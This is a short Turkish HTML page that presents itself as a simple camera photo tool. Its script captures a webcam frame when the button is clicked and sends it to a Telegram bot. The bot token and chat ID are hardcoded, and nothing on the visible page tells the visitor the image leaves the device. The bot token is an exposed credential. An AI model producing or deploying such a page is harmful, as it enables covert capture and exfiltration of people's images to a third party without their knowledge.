<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kamera Fotoğrafı Gönder</title>
</head>
<body>
  <h2>Kamera izni verin ve fotoğraf çekin</h2>
  <video id="video" width="640" height="480" autoplay></video>
  <button id="takePhoto">Fotoğraf Çek</button>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const button = document.getElementById('takePhoto');

    const BOT_TOKEN = "8019450857:AAG1eQgjYVdQ26p4XH8HAdTdMLGHnAbYALY";  // Telegram Bot Tokenını buraya gir
    const CHAT_ID = "1149820913";      // Telegram Chat ID'ni buraya gir

    // Kameraya erişim izni al
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
      })
      .catch(error => {
        alert('Kamera açılamadı: ' + error);
      });

    button.onclick = () => {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Fotoğrafı base64 formatına çevir
      const photoData = canvas.toDataURL('image/png');

      // Fotoğrafı Telegram botuna gönder
      sendPhoto(photoData);
    };

    function sendPhoto(photo) {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          photo: photo
        })
      })
      .then(response => response.json())
      .then(data => console.log('Fotoğraf Gönderildi:', data))
      .catch(error => console.error('Hata:', error));
    }
  </script>
</body>
</html>
